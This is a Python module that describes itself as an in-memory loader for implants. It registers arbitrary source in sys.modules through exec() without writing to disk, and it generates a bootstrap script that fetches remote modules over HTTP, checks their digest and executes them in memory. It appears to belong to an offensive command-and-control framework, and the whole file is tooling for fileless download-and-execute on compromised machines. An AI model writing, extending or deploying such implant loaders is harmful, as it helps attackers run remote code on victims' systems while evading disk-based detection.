#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""In-memory Python module loader for implants (no disk write)."""

from __future__ import annotations

import hashlib
import importlib.util
import sys
import types
from typing import Any, Dict, Optional


def compute_sha256(content: bytes) -> str:
    return hashlib.sha256(content).hexdigest()


def load_module_from_source(
    module_path: str,
    source: str,
    *,
    cache: Optional[Dict[str, Any]] = None,
) -> types.ModuleType:
    """Load Python source into memory and register it in sys.modules."""
    cache = cache if cache is not None else {}
    key = str(module_path or "").strip()
    if not key:
        raise ValueError("module_path is required")
    if key in cache:
        cached = cache[key]
        if isinstance(cached, types.ModuleType):
            return cached

    mod_name = "kitty_remote_" + key.replace("/", "_").replace(".", "_")
    spec = importlib.util.spec_from_loader(mod_name, loader=None)
    if spec is None:
        raise ImportError(f"Could not create spec for {key}")
    module = importlib.util.module_from_spec(spec)
    exec(source, module.__dict__)
    module.__kitty_module_path__ = key
    sys.modules[mod_name] = module
    cache[key] = module
    return module


def build_memimporter_bootstrap(*, var_name: str = "_kitty_memimporter") -> str:
    """Return Python source for in-memory module loading after HTTP fetch."""
    return f'''
import hashlib as _h
import importlib.util as _iu
import sys as _sys
import types as _types

{var_name} = {{"cache": {{}}}}

def _kitty_load_module_from_source(module_path, source):
    key = str(module_path or "").strip()
    if not key:
        raise ValueError("module_path is required")
    if key in {var_name}["cache"]:
        return {var_name}["cache"][key]
    mod_name = "kitty_remote_" + key.replace("/", "_").replace(".", "_")
    spec = _iu.spec_from_loader(mod_name, loader=None)
    if spec is None:
        raise ImportError("spec failed for %s" % key)
    module = _iu.module_from_spec(spec)
    exec(source, module.__dict__)
    module.__kitty_module_path__ = key
    _sys.modules[mod_name] = module
    {var_name}["cache"][key] = module
    return module

def _kitty_fetch_module_mem(module_path, fetch_fn, language="python"):
    raw = fetch_fn(module_path, language=language)
    if isinstance(raw, bytes):
        raw = raw.decode("utf-8", errors="replace")
    import json as _j
    data = _j.loads(raw) if raw.strip().startswith("{{") else {{"content": raw, "sha256": ""}}
    content = data.get("content") or ""
    digest = data.get("sha256") or ""
    if digest and _h.sha256(content.encode()).hexdigest() != digest:
        raise ValueError("remote module digest mismatch")
    return _kitty_load_module_from_source(module_path, content)
'''.strip()
